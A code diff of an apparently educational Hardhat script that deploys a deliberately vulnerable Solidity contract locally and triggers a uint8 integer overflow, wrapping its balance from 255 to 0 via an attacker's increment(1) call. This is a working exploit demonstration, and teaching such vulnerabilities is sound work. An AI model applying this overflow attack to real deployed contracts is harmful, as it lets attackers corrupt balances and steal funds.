@@ -1,9 +1,9 @@
 const { ethers } = require("hardhat");
-const fs = require("fs");
-const path = require("path");
 
 async function main() {
-  console.log("🚀 Initiating attack on SC08_IntegerOverflowAndUnderflow_Vulnerable...");
+  console.log(
+    "🚀 Initiating attack on SC08_IntegerOverflowAndUnderflow_Vulnerable..."
+  );
 
   // --- 1. GET THE SIGNERS ---
   const [deployer, attacker] = await ethers.getSigners();
@@ -11,44 +11,35 @@ async function main() {
   console.log(`Deployer Address: ${deployer.address}`);
   console.log(`Attacker Address: ${attacker.address}`);
 
-  // --- 2. GET THE DEPLOYED CONTRACT ---
-  const envPath = path.join(__dirname, "..", "frontend", ".env");
-  if (!fs.existsSync(envPath)) {
-    throw new Error("❌ Could not find the .env file in frontend/. Please deploy contracts first.");
-  }
-  const envFile = fs.readFileSync(envPath, "utf8");
-  const addressMatch = envFile.match(/VITE_SC08_VULNERABLE_ADDRESS='(.*)'/);
-
-  if (!addressMatch) {
-    throw new Error("❌ Could not find the vulnerable contract address in frontend/.env. Please deploy contracts first.");
-  }
-  const vulnerableContractAddress = addressMatch[1];
+  // --- 2. DEPLOY THE CONTRACT ---
+  console.log("\nDeploying contract...");
+  const SC08 = await ethers.getContractFactory(
+    "SC08_IntegerOverflowAndUnderflow_Vulnerable"
+  );
+  const vulnerableContract = await SC08.deploy();
+  await vulnerableContract.waitForDeployment();
+  const vulnerableContractAddress = vulnerableContract.target;
   console.log(`\n🎯 Target Contract Address: ${vulnerableContractAddress}`);
-
-  const vulnerableContract = await ethers.getContractAt("SC08_IntegerOverflowAndUnderflow_Vulnerable", vulnerableContractAddress);
 
   // --- 3. EXECUTE THE ATTACK ---
   console.log("\n💰 Checking balance before the attack...");
-  const balanceBefore = await vulnerableContract.balance();
-  console.log(`   - Balance before overflow: ${balanceBefore.toString()}`);
+  let currentBalance = await vulnerableContract.getBalance();
+  console.log(`   - Initial balance: ${currentBalance}`);
 
-  if (balanceBefore.toString() !== "255") {
-    console.warn("⚠️  Warning: Initial balance is not 255. The contract might not be in its initial state.");
-  }
-
-  console.log("\n💥 ATTACKING: Calling the increment(1) function to cause an overflow...");
+  console.log("\n💥 ATTACKING: Triggering an integer overflow...");
+  // The balance is a uint8, max value 255. Adding 1 will cause it to overflow and wrap around to 0.
   const tx = await vulnerableContract.connect(attacker).increment(1);
   await tx.wait();
   console.log("✅ Attack transaction successful!");
 
   console.log("\n💰 Checking balance after the attack...");
-  const balanceAfter = await vulnerableContract.balance();
-  console.log(`   - Balance after overflow: ${balanceAfter.toString()}`);
+  currentBalance = await vulnerableContract.getBalance();
+  console.log(`   - Balance after overflow: ${currentBalance}`);
 
-  if (balanceAfter.toString() === "0") {
-    console.log("\n🎉 SUCCESS: The balance has overflowed and wrapped around to 0!");
+  if (currentBalance < 255) {
+    console.log("\n🎉 SUCCESS: The integer overflow was successful!");
   } else {
-    console.log("\n😞 FAILED: The balance did not overflow as expected.");
+    console.log("\n😞 FAILED: The integer overflow did not occur as expected.");
   }
 }
 
